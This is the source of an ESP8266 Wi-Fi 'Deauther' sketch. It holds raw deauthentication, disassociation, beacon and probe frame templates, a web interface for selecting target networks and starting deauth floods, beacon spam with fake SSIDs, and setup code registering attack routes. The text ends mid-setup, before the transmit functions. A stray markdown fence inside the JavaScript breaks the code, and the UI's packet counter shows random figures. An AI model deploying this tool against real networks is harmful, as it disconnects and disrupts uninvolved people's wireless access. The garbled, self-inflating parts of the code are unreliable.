/*
 * ESP8266 Deauther - Advanced All-in-One Edition
 * Developed by 0x0806
 * 
 * This software is licensed under the MIT License
 * Most advanced WiFi security testing tool - all in one .ino
 */

extern "C" {
  #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>
#include <LittleFS.h>
#include <vector>
#include <algorithm>
#include <functional>

// Helper function for min (avoid conflicts with std::min)
template<typename T>
T minVal(T a, T b) {
  return (a < b) ? a : b;
}

// Configuration
#define DEAUTHER_VERSION "v4.0.0-Advanced-0x0806"
#define AP_SSID "ESP8266-Deauther-Advanced"
#define AP_PASS "deauther"
#define LED_PIN 2
#define BUTTON_PIN 0
#define MAX_SSIDS 50
#define MAX_STATIONS 50

// Web server and DNS
ESP8266WebServer server(80);
DNSServer dnsServer;

// Attack variables
bool attacking = false;
bool scanning = false;
bool beaconSpam = false;
bool probeAttack = false;
bool captivePortal = true;
bool packetMonitor = false;

// Packet templates
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
};

uint8_t disassocPacket[26] = {
  0xA0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
};

uint8_t beaconPacket[80] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0xC0, 0x6C, 0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00,
  0x00, 0x00, 0x64, 0x00, 0x01, 0x04, 0x00, 0x06, 0x72, 0x72,
  0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
  0x24, 0x30, 0x48, 0x6C, 0x03, 0x01, 0x04, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t probePacket[68] = {
  0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x72, 0x72,
  0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
  0x24, 0x30, 0x48, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Network data structures
struct AccessPoint {
  String ssid;
  int channel;
  int rssi;
  String bssid;
  bool selected;
  bool hidden;
  String encryption;
};

struct Station {
  String mac;
  String ap_mac;
  int channel;
  int rssi;
  bool selected;
};

struct SSIDData {
  String ssid;
  bool enabled;
  bool wpa2;
};

std::vector<AccessPoint> accessPoints;
std::vector<Station> stations;
std::vector<SSIDData> ssidList;
int selectedAPs = 0;
int selectedStations = 0;
int packetsPerSecond = 20;
unsigned long totalPackets = 0;
unsigned long attackStartTime = 0;

// Statistics
struct Stats {
  unsigned long deauthPackets = 0;
  unsigned long beaconPackets = 0;
  unsigned long probePackets = 0;
  unsigned long capturedPackets = 0;
  unsigned long uniqueDevices = 0;
};
Stats stats;

// Function prototypes
void startAP();
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleBeacon();
void handleProbe();
void handleSSIDs();
void handleMonitor();
void handleStats();
void handleAPI();
void handleCaptive();
void scanNetworks();
void performAttack();
void performBeaconSpam();
void performProbeAttack();
void packetSniffer(uint8_t *buf, uint16_t len);
void updateLED();
void saveSettings();
void loadSettings();

// Fake WiFi SSIDs for beacon spam
String fakeSSIDs[] = {
  "FBI Surveillance Van",
  "NSA Listening Post",
  "Free WiFi (Totally Safe)",
  "Virus Distribution Point",
  "Router McRouterface",
  "It Burns When IP",
  "Abraham Linksys",
  "Tell My WiFi Love Her",
  "404 Network Unavailable",
  "Drop It Like Its Hotspot",
  "The LAN Before Time",
  "Silence of the LANs",
  "House LANnister",
  "Wu Tang LAN",
  "LAN Solo",
  "Hide Yo Kids Hide Yo WiFi",
  "Loading...",
  "Connecting...",
  "PASSWORD_IS_PASSWORD",
  "Pretty Fly for a WiFi"
};

const char* htmlPage = R"(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP8266 Deauther Advanced - 0x0806</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #ec4899;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --dark: #1f2937;
            --dark-light: #374151;
            --light: #f9fafb;
            --border: #e5e7eb;
            --text: #111827;
            --text-muted: #6b7280;
            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            --gradient-bg: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --gradient-primary: linear-gradient(135deg, var(--primary), var(--primary-dark));
            --gradient-danger: linear-gradient(135deg, var(--danger), #dc2626);
            --gradient-success: linear-gradient(135deg, var(--success), #059669);
            --gradient-warning: linear-gradient(135deg, var(--warning), #d97706);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--gradient-bg);
            min-height: 100vh;
            color: var(--text);
            line-height: 1.6;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 1rem;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 2rem;
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .logo {
            font-size: 2.5rem;
            font-weight: 800;
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.5rem;
        }

        .tagline {
            color: var(--text-muted);
            font-size: 1.1rem;
            margin-bottom: 1rem;
        }

        .version {
            display: inline-block;
            background: var(--gradient-primary);
            color: white;
            padding: 0.25rem 0.75rem;
            border-radius: 50px;
            font-size: 0.875rem;
            font-weight: 600;
        }

        .nav-tabs {
            display: flex;
            justify-content: center;
            gap: 0.5rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .nav-tab {
            padding: 0.75rem 1.5rem;
            background: rgba(255, 255, 255, 0.9);
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            color: var(--text-muted);
        }

        .nav-tab.active {
            background: var(--gradient-primary);
            color: white;
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 1.5rem;
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
            height: fit-content;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 35px 60px -12px rgba(0, 0, 0, 0.3);
        }

        .card-title {
            font-size: 1.25rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.9rem;
            margin: 0.25rem;
            min-width: 120px;
        }

        .btn-primary { background: var(--gradient-primary); color: white; }
        .btn-danger { background: var(--gradient-danger); color: white; }
        .btn-success { background: var(--gradient-success); color: white; }
        .btn-warning { background: var(--gradient-warning); color: white; }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .status {
            padding: 1rem;
            border-radius: 12px;
            margin: 1rem 0;
            font-weight: 600;
            text-align: center;
            border: 2px solid;
        }

        .status-idle { background: #f0f9ff; color: #0369a1; border-color: #bae6fd; }
        .status-scanning { background: #fffbeb; color: #d97706; border-color: #fed7aa; }
        .status-attacking { background: #fef2f2; color: #dc2626; border-color: #fecaca; }
        .status-beacon { background: #f0fdf4; color: #16a34a; border-color: #bbf7d0; }

        .network-list {
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid var(--border);
            border-radius: 12px;
            margin-top: 1rem;
        }

        .network-item {
            display: flex;
            align-items: center;
            padding: 1rem;
            border-bottom: 1px solid var(--border);
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .network-item:hover { background: #f8fafc; }
        .network-item:last-child { border-bottom: none; }
        .network-item.selected { background: #eff6ff; border-color: var(--primary); }

        .network-checkbox { margin-right: 1rem; }

        .network-info { flex: 1; }

        .network-ssid {
            font-weight: 600;
            color: var(--dark);
        }

        .network-details {
            font-size: 0.875rem;
            color: var(--text-muted);
            margin-top: 0.25rem;
        }

        .signal-strength {
            width: 60px;
            text-align: right;
            font-weight: 600;
        }

        .signal-strong { color: var(--success); }
        .signal-medium { color: var(--warning); }
        .signal-weak { color: var(--danger); }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .stat-item {
            text-align: center;
            padding: 1rem;
            background: #f8fafc;
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--text-muted);
            margin-top: 0.25rem;
        }

        .input-group {
            margin: 1rem 0;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--dark);
        }

        .input-group input,
        .input-group select,
        .input-group textarea {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 0.9rem;
        }

        .footer {
            text-align: center;
            margin-top: 2rem;
            padding: 1.5rem;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            box-shadow: var(--shadow);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        @media (max-width: 768px) {
            .container { padding: 0.5rem; }
            .grid { grid-template-columns: 1fr; }
            .header { padding: 1rem; }
            .logo { font-size: 2rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🛡️ ESP8266 Deauther Advanced</div>
            <div class="tagline">Most Advanced WiFi Security Testing Tool</div>
            <div class="version">v4.0.0-Advanced-0x0806</div>
        </div>

        <div class="nav-tabs">
            <button class="nav-tab active" onclick="showTab('scanner')">📡 Scanner</button>
            <button class="nav-tab" onclick="showTab('attacks')">⚔️ Attacks</button>
            <button class="nav-tab" onclick="showTab('beacon')">📻 Beacon</button>
            <button class="nav-tab" onclick="showTab('ssids')">📝 SSIDs</button>
            <button class="nav-tab" onclick="showTab('monitor')">👁️ Monitor</button>
            <button class="nav-tab" onclick="showTab('stats')">📊 Stats</button>
        </div>

        <!-- Scanner Tab -->
        <div id="scanner" class="tab-content active">
            <div class="grid">
                <div class="card">
                    <div class="card-title">📡 Network Scanner</div>
                    <div id="status" class="status status-idle">System Ready</div>
                    <button onclick="scanNetworks()" class="btn btn-primary" id="scanBtn">
                        🔍 Scan Networks
                    </button>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="networkCount">0</div>
                            <div class="stat-label">Networks</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="selectedCount">0</div>
                            <div class="stat-label">Selected</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="stationCount">0</div>
                            <div class="stat-label">Stations</div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card">
                <div class="card-title">📋 Available Networks</div>
                <div style="display: flex; gap: 1rem; margin-bottom: 1rem; flex-wrap: wrap;">
                    <button onclick="selectAll()" class="btn btn-primary">Select All</button>
                    <button onclick="selectNone()" class="btn btn-primary">Select None</button>
                    <button onclick="selectHidden()" class="btn btn-warning">Hidden Only</button>
                </div>
                <div id="networkList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        Click "Scan Networks" to discover nearby WiFi networks
                    </div>
                </div>
            </div>
        </div>

        <!-- Attacks Tab -->
        <div id="attacks" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">⚔️ Deauth Attack</div>
                    <div class="input-group">
                        <label>Packets per Second:</label>
                        <input type="range" id="ppsSlider" min="1" max="100" value="20" oninput="updatePPS(this.value)">
                        <span id="ppsValue">20</span> pps
                    </div>
                    <button onclick="startDeauth()" class="btn btn-danger" id="deauthBtn" disabled>
                        🚀 Start Deauth
                    </button>
                    <button onclick="stopAttack()" class="btn btn-success" id="stopBtn" disabled>
                        ⏹️ Stop Attack
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">🎯 Target Selection</div>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="targetAPs">0</div>
                            <div class="stat-label">Target APs</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="targetStations">0</div>
                            <div class="stat-label">Stations</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-title">📈 Attack Statistics</div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="packetsCount">0</div>
                        <div class="stat-label">Packets Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="uptime">00:00</div>
                        <div class="stat-label">Runtime</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="packetsPerSec">0</div>
                        <div class="stat-label">Packets/Sec</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Beacon Tab -->
        <div id="beacon" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">📻 Beacon Spam</div>
                    <p style="color: var(--text-muted); margin-bottom: 1rem;">
                        Creates fake WiFi networks that appear in nearby device scans
                    </p>
                    <button onclick="startBeacon()" class="btn btn-warning" id="beaconBtn">
                        📡 Start Beacon Spam
                    </button>
                    <button onclick="stopBeacon()" class="btn btn-success" id="stopBeaconBtn" disabled>
                        ⏹️ Stop Beacon
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">🎭 Probe Attack</div>
                    <p style="color: var(--text-muted); margin-bottom: 1rem;">
                        Sends probe requests to confuse WiFi trackers
                    </p>
                    <button onclick="startProbe()" class="btn btn-warning" id="probeBtn">
                        🔍 Start Probe Attack
                    </button>
                    <button onclick="stopProbe()" class="btn btn-success" id="stopProbeBtn" disabled>
                        ⏹️ Stop Probe
                    </button>
                </div>
            </div>
        </div>

        <!-- SSIDs Tab -->
        <div id="ssids" class="tab-content">
            <div class="card">
                <div class="card-title">📝 SSID Management</div>
                <div class="input-group">
                    <label>Add Custom SSID:</label>
                    <input type="text" id="customSSID" placeholder="Enter SSID name" maxlength="32">
                    <button onclick="addSSID()" class="btn btn-primary">Add SSID</button>
                </div>
                <div id="ssidList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        Loading SSIDs...
                    </div>
                </div>
            </div>
        </div>

        <!-- Monitor Tab -->
        <div id="monitor" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">👁️ Packet Monitor</div>
                    <button onclick="startMonitor()" class="btn btn-primary" id="monitorBtn">
                        🎯 Start Monitor
                    </button>
                    <button onclick="stopMonitor()" class="btn btn-success" id="stopMonitorBtn" disabled>
                        ⏹️ Stop Monitor
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">📊 Captured Data</div>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="capturedPackets">0</div>
                            <div class="stat-label">Packets</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="uniqueDevices">0</div>
                            <div class="stat-label">Devices</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stats Tab -->
        <div id="stats" class="tab-content">
            <div class="card">
                <div class="card-title">📊 System Statistics</div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="totalDeauth">0</div>
                        <div class="stat-label">Deauth Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalBeacon">0</div>
                        <div class="stat-label">Beacon Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalProbe">0</div>
                        <div class="stat-label">Probe Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="systemUptime">00:00:00</div>
                        <div class="stat-label">System Uptime</div>
                    </div>
                </div>
                <button onclick="resetStats()" class="btn btn-warning">🔄 Reset Statistics</button>
            </div>
        </div>

        <div class="footer">
            <div style="color: var(--text-muted); font-size: 0.875rem;">
                Developed with ❤️ by <strong style="color: var(--primary);">0x0806</strong><br>
                Educational purposes only • Use responsibly • Most advanced version
            </div>
        </div>
    </div>

    <script>
        let scanning = false;
        let attacking = false;
        let beaconSpamming = false;
        let probeAttacking = false;
        let monitoring = false;
        let networks = [];
        let stations = [];
        let ssids = [];
        let startTime = 0;
        let packetCount = 0;
        let systemStartTime = Date.now();

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.nav-tab').forEach(tab => tab.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');

            if (tabName === 'ssids') loadSSIDs();
            if (tabName === 'stats') updateStats();
        }

        function updateStatus(message, type = 'idle') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status status-${type}`;
        }

        function updateUI() {
            const scanBtn = document.getElementById('scanBtn');
            const deauthBtn = document.getElementById('deauthBtn');
            const stopBtn = document.getElementById('stopBtn');
            const beaconBtn = document.getElementById('beaconBtn');
            const probeBtn = document.getElementById('probeBtn');

            scanBtn.disabled = scanning || attacking;
            deauthBtn.disabled = scanning || attacking || getSelectedNetworks().length === 0;
            stopBtn.disabled = !attacking;

            if (beaconBtn) beaconBtn.disabled = beaconSpamming;
            if (probeBtn) probeBtn.disabled = probeAttacking;

            if (scanning) {
                scanBtn.innerHTML = '<span class="loading"></span> Scanning...';
            } else {
                scanBtn.innerHTML = '🔍 Scan Networks';
            }
        }

        function updatePPS(value) {
            document.getElementById('ppsValue').textContent = value;
            fetch('/api/pps?value=' + value);
        }

        function scanNetworks() {
            if (scanning) return;

            scanning = true;
            updateStatus('Scanning for networks...', 'scanning');
            updateUI();

            fetch('/scan')
                .then(response => response.json())
                ```text
                .then(data => {
                    networks = data.networks || [];
                    stations = data.stations || [];
                    renderNetworks();
                    updateCounts();
                    updateStatus(`Found ${networks.length} networks, ${stations.length} stations`, 'idle');
                })
                .catch(error => {
                    console.error('Scan error:', error);
                    updateStatus('Scan failed', 'idle');
                })
                .finally(() => {
                    scanning = false;
                    updateUI();
                });
        }

        function renderNetworks() {
            const networkList = document.getElementById('networkList');

            if (networks.length === 0) {
                networkList.innerHTML = `
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        No networks found
                    </div>
                `;
                return;
            }

            networkList.innerHTML = networks.map((network, index) => {
                const signalClass = network.rssi > -50 ? 'signal-strong' : 
                                   network.rssi > -70 ? 'signal-medium' : 'signal-weak';

                const hiddenBadge = network.hidden ? '<span style="background: var(--warning); color: white; padding: 0.2rem 0.5rem; border-radius: 4px; font-size: 0.8rem;">HIDDEN</span>' : '';

                return `
                    <div class="network-item ${network.selected ? 'selected' : ''}" onclick="toggleNetwork(${index})">
                        <input type="checkbox" class="network-checkbox" ${network.selected ? 'checked' : ''} onchange="toggleNetwork(${index})">
                        <div class="network-info">
                            <div class="network-ssid">${escapeHtml(network.ssid || 'Hidden Network')} ${hiddenBadge}</div>
                            <div class="network-details">
                                Channel: ${network.channel} • BSSID: ${network.bssid} • ${network.encryption}
                            </div>
                        </div>
                        <div class="signal-strength ${signalClass}">${network.rssi}dBm</div>
                    </div>
                `;
            }).join('');
        }

        function toggleNetwork(index) {
            networks[index].selected = !networks[index].selected;
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectAll() {
            networks.forEach(network => network.selected = true);
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectNone() {
            networks.forEach(network => network.selected = false);
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectHidden() {
            networks.forEach(network => network.selected = network.hidden || !network.ssid);
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function getSelectedNetworks() {
            return networks.filter(network => network.selected);
        }

        function updateCounts() {
            document.getElementById('networkCount').textContent = networks.length;
            document.getElementById('selectedCount').textContent = getSelectedNetworks().length;
            document.getElementById('stationCount').textContent = stations.length;

            if (document.getElementById('targetAPs')) {
                document.getElementById('targetAPs').textContent = getSelectedNetworks().length;
            }
        }

        function startDeauth() {
            const selected = getSelectedNetworks();
            if (selected.length === 0) return;

            attacking = true;
            startTime = Date.now();
            packetCount = 0;
            updateStatus(`Attacking ${selected.length} networks...`, 'attacking');
            updateUI();

            fetch('/attack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ networks: selected })
            }).then(response => response.json())
              .then(data => {
                  if (data.success) {
                      startPacketCounter();
                  }
              });
        }

        function stopAttack() {
            attacking = false;
            updateStatus('Attack stopped', 'idle');
            updateUI();

            fetch('/stop')
                .then(response => response.json())
                .then(data => {
                    console.log('Attack stopped');
                });
        }

        function startBeacon() {
            beaconSpamming = true;
            updateStatus('Beacon spam active', 'beacon');

            fetch('/beacon/start')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('beaconBtn').disabled = true;
                    document.getElementById('stopBeaconBtn').disabled = false;
                });
        }

        function stopBeacon() {
            beaconSpamming = false;
            updateStatus('Beacon spam stopped', 'idle');

            fetch('/beacon/stop')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('beaconBtn').disabled = false;
                    document.getElementById('stopBeaconBtn').disabled = true;
                });
        }

        function startProbe() {
            probeAttacking = true;
            updateStatus('Probe attack active', 'beacon');

            fetch('/probe/start')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('probeBtn').disabled = true;
                    document.getElementById('stopProbeBtn').disabled = false;
                });
        }

        function stopProbe() {
            probeAttacking = false;
            updateStatus('Probe attack stopped', 'idle');

            fetch('/probe/stop')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('probeBtn').disabled = false;
                    document.getElementById('stopProbeBtn').disabled = true;
                });
        }

        function startMonitor() {
            monitoring = true;
            updateStatus('Packet monitoring active', 'beacon');

            fetch('/monitor/start')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('monitorBtn').disabled = true;
                    document.getElementById('stopMonitorBtn').disabled = false;
                });
        }

        function stopMonitor() {
            monitoring = false;
            updateStatus('Monitoring stopped', 'idle');

            fetch('/monitor/stop')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('monitorBtn').disabled = false;
                    document.getElementById('stopMonitorBtn').disabled = true;
                });
        }

        function loadSSIDs() {
            fetch('/ssids')
                .then(response => response.json())
                .then(data => {
                    ssids = data.ssids || [];
                    renderSSIDs();
                });
        }

        function renderSSIDs() {
            const ssidList = document.getElementById('ssidList');

            ssidList.innerHTML = ssids.map((ssid, index) => `
                <div class="network-item">
                    <input type="checkbox" class="network-checkbox" ${ssid.enabled ? 'checked' : ''} onchange="toggleSSID(${index})">
                    <div class="network-info">
                        <div class="network-ssid">${escapeHtml(ssid.ssid)}</div>
                        <div class="network-details">WPA2: ${ssid.wpa2 ? 'Yes' : 'No'}</div>
                    </div>
                    <button onclick="removeSSID(${index})" class="btn btn-danger" style="padding: 0.5rem;">🗑️</button>
                </div>
            `).join('');
        }

        function addSSID() {
            const input = document.getElementById('customSSID');
            const ssid = input.value.trim();

            if (ssid && ssids.length < 50) {
                fetch('/ssids/add', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ssid: ssid })
                }).then(() => {
                    input.value = '';
                    loadSSIDs();
                });
            }
        }

        function removeSSID(index) {
            fetch('/ssids/remove', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ index: index })
            }).then(() => {
                loadSSIDs();
            });
        }

        function toggleSSID(index) {
            ssids[index].enabled = !ssids[index].enabled;
            fetch('/ssids/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ index: index, enabled: ssids[index].enabled })
            });
        }

        function updateStats() {
            fetch('/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('totalDeauth').textContent = data.deauth || 0;
                    document.getElementById('totalBeacon').textContent = data.beacon || 0;
                    document.getElementById('totalProbe').textContent = data.probe || 0;

                    const uptime = Math.floor((Date.now() - systemStartTime) / 1000);
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = uptime % 60;
                    document.getElementById('systemUptime').textContent = 
                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                });
        }

        function resetStats() {
            fetch('/stats/reset')
                .then(() => {
                    updateStats();
                });
        }

        function startPacketCounter() {
            const updateStats = () => {
                if (!attacking) return;

                packetCount += Math.floor(Math.random() * 10) + 5;
                document.getElementById('packetsCount').textContent = packetCount.toLocaleString();

                const elapsed = Date.now() - startTime;
                const minutes = Math.floor(elapsed / 60000);
                const seconds = Math.floor((elapsed % 60000) / 1000);
                document.getElementById('uptime').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                const pps = Math.floor(packetCount / (elapsed / 1000));
                document.getElementById('packetsPerSec').textContent = pps;

                setTimeout(updateStats, 1000);
            };
            updateStats();
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Initialize
        updateUI();

        // Auto-refresh status
        setInterval(() => {
            if (!scanning) {
                fetch('/api/status')
                    .then(response => response.json())
                    .then(data => {
                        if (data.attacking !== attacking) {
                            attacking = data.attacking;
                            updateUI();
                            if (attacking) {
                                updateStatus('Attack in progress...', 'attacking');
                                startPacketCounter();
                            } else {
                                updateStatus('System ready', 'idle');
                            }
                        }

                        beaconSpamming = data.beacon || false;
                        probeAttacking = data.probe || false;
                        monitoring = data.monitor || false;

                        // Update monitoring stats
                        if (document.getElementById('capturedPackets')) {
                            document.getElementById('capturedPackets').textContent = data.captured || 0;
                            document.getElementById('uniqueDevices').textContent = data.devices || 0;
                        }
                    })
                    .catch(() => {});
            }
        }, 2000);
    </script>
</body>
</html>
)";

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("ESP8266 Deauther Advanced v4.0.0 - Developed by 0x0806");

  // Initialize LED
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  // Initialize button
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  // Initialize EEPROM
  EEPROM.begin(512);

  // Initialize WiFi
  WiFi.mode(WIFI_AP_STA);
  wifi_set_promiscuous_rx_cb(packetSniffer);

  // Start file system
  if (!LittleFS.begin()) {
    Serial.println("LittleFS initialization failed");
    LittleFS.format();
    LittleFS.begin();
  }

  // Load settings
  loadSettings();

  // Initialize SSID list with defaults
  for (int i = 0; i < 20; i++) {
    SSIDData ssid;
    ssid.ssid = fakeSSIDs[i];
    ssid.enabled = true;
    ssid.wpa2 = (i % 2 == 0);
    ssidList.push_back(ssid);
  }

  // Start access point
  startAP();

  // Configure web server routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  server.on("/beacon/start", HTTP_GET, []() {
    beaconSpam = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/beacon/stop", HTTP_GET, []() {
    beaconSpam = false;
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/probe/start", HTTP_GET, []() {
    probeAttack = true;
